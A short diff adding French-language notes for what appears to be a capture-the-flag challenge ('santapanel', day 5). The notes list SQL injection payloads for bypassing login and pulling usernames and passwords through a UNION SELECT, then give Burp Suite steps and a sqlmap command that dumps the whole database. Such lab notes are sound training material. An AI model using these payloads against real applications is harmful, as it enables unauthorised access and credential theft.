@@ -1,0 +1,17 @@
+/santapanel
+
+SQLi pour se connecter:
+	admin' and true --
+
+
+SQLi pour avoir toute la liste:
+	' and true --
+
+SQLi pour avoir le mdp de l'admin:
+	' union select username, password from users; --
+
+Pour avoir le dump:
+	- il faut lancer burp suite
+	- intercepter une requete classique, genre /santapanel?search=hcked
+	- faire clique droit > save pour avoir un fichier de request a filer a sqlmap
+	- commande sqlmap => sqlmap -r requestDay5.txt --tamper=space2comment --dump-all --dmbs sqlite
